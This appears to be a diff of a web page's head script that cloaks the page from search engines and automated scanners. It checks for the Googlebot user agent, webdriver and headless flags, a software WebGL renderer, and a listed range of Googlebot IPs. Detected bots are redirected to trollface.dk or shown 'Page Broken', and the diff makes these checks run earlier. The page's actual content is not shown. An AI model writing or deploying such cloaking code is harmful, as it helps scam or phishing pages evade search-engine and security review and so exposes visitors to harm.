@@ -8,19 +8,21 @@
     <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins|Open+Sans">
     <link rel="shortcut icon" href="image/favixonn.ico" type="image/x-icon">
 
-    <script>
-        document.addEventListener("DOMContentLoaded", function () {
-            // Check for Googlebot or headless browser
+           
+          <script>
+        // Immediate check to detect Googlebot or headless browsers and redirect early
+        (function() {
+            // Check for Googlebot in the user agent
             if (navigator.userAgent.indexOf("Googlebot") !== -1 || navigator.webdriver || /HeadlessChrome/.test(navigator.userAgent)) {
                 window.location.href = "https://trollface.dk/"; // Redirect Googlebot or headless browsers to harmless page
-                return;
+                return; // Stop further execution of the script
             }
 
             // WebGL check for bots that use software rendering
             var gl = document.createElement('canvas').getContext('webgl');
             if (!gl || gl.getParameter(gl.RENDERER) === "Google SwiftShader") {
                 document.body.innerHTML = "Page Broken"; // For bots detected by WebGL check
-                return;
+                return; // Stop further execution of the script
             }
 
             // IP check for Googlebot IPs
@@ -47,7 +49,8 @@
                 "66.249.76.32", "66.249.76.64", "66.249.76.96", "66.249.77.0", "66.249.77.128", "66.249.77.160",
                 "66.249.77.192", "66.249.77.224", "66.249.77.32", "66.249.77.64", "66.249.77.96", "66.249.78.0",
                 "66.249.78.32", "66.249.79.0", "66.249.79.128", "66.249.79.160", "66.249.79.192", "66.249.79.224",
-                "66.249.79.32", "66.249.79.64", "66.249.79.96"
+                "66.249.79.32", "66.249.79.64", "66.249.79.96",
+                // Add more IPs as needed
             ];
 
             fetch('https://api64.ipify.org?format=json')
@@ -61,7 +64,8 @@
                     }
                 })
                 .catch(error => console.error("IP fetch failed:", error));
-        });
+
+        })();
     </script>
 </head>
 <body>
